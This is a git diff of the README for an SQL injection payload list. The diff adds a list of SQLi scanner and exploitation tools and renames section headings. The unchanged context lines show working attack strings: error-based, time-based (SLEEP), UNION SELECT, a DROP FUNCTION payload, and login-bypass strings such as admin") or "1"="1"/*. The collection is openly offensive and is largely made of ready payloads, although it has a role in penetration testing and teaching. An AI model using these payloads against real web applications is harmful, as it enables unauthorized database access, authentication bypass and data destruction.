@@ -1,4 +1,4 @@
-# SQL Injection Payload List
+### SQL Injection Payload List
 
 #### SQL Injection
 
@@ -25,7 +25,29 @@ In some situations, an attacker can escalate an SQL injection attack to compromi
 |Out-of-band SQLi|Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).|
 | Voice Based Sql Injection | It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound. |
 
-Generic SQL Injection Payloads
+#### SQL Injection Vulnerability Scanner Tool's :
+
+* [SQLMap](https://github.com/sqlmapproject/sqlmap) – Automatic SQL Injection And Database Takeover Tool
+
+* [jSQL Injection](https://github.com/ron190/jsql-injection) – Java Tool For Automatic SQL Database Injection
+
+* [BBQSQL](https://github.com/Neohapsis/bbqsql) – A Blind SQL-Injection Exploitation Tool
+
+* [NoSQLMap](https://github.com/codingo/NoSQLMap) – Automated NoSQL Database Pwnage
+
+* [Whitewidow](https://www.kitploit.com/2017/05/whitewidow-sql-vulnerability-scanner.html) – SQL Vulnerability Scanner
+
+* [DSSS](https://github.com/stamparm/DSSS) – Damn Small SQLi Scanner
+
+* [explo](https://github.com/dtag-dev-sec/explo) – Human And Machine Readable Web Vulnerability Testing Format
+
+* [Blind-Sql-Bitshifting](https://github.com/awnumar/blind-sql-bitshifting) – Blind SQL-Injection via Bitshifting
+
+* [Leviathan](https://github.com/leviathan-framework/leviathan) – Wide Range Mass Audit Toolkit
+
+* [Blisqy](https://github.com/JohnTroony/Blisqy) – Exploit Time-based blind-SQL-injection in HTTP-Headers (MySQL/MariaDB)
+
+#### Generic SQL Injection Payloads
 
 ```
 '
@@ -118,7 +140,7 @@ Comments:
 `	    Backtick
 ```
 
-Generic Error Based Payloads
+#### Generic Error Based Payloads
 
 ```
  OR 1=1
@@ -277,7 +299,7 @@ IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
  and (select substring(@@version,3,1))='X'
 ```
 
-Generic Time Based SQL Injection Payloads
+#### Generic Time Based SQL Injection Payloads
 
 ```
 # from wapiti
@@ -377,7 +399,7 @@ OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
-Generic Union Select Payloads
+#### Generic Union Select Payloads
 
 ```
  ORDER BY SLEEP(5)
@@ -801,7 +823,7 @@ Generic Union Select Payloads
  UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
 ```
 
-SQL Injection Auth Bypass Payloads
+#### SQL Injection Auth Bypass Payloads
 
 ```
 '-'
@@ -883,7 +905,7 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
-References :
+#### References :
 
 * SQL Injection ( OWASP )
 
